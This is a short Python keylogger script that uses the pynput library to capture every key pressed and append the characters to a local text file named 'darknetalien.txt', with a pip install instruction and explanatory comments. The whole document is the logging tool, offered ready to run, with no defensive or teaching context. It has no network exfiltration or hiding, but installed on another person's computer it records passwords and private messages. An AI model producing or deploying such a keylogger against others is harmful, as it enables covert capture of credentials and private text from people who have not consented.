#First install pynput with <pip install pynput>
from pynput import keyboard #Import the keyboard package from pynput library

def keyPressed(key):
    print(str(key))
    with open("darknetalien.txt", 'a')as logKey: #take all logged key inputs and append to the txt document named "darknetalien.txt"
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
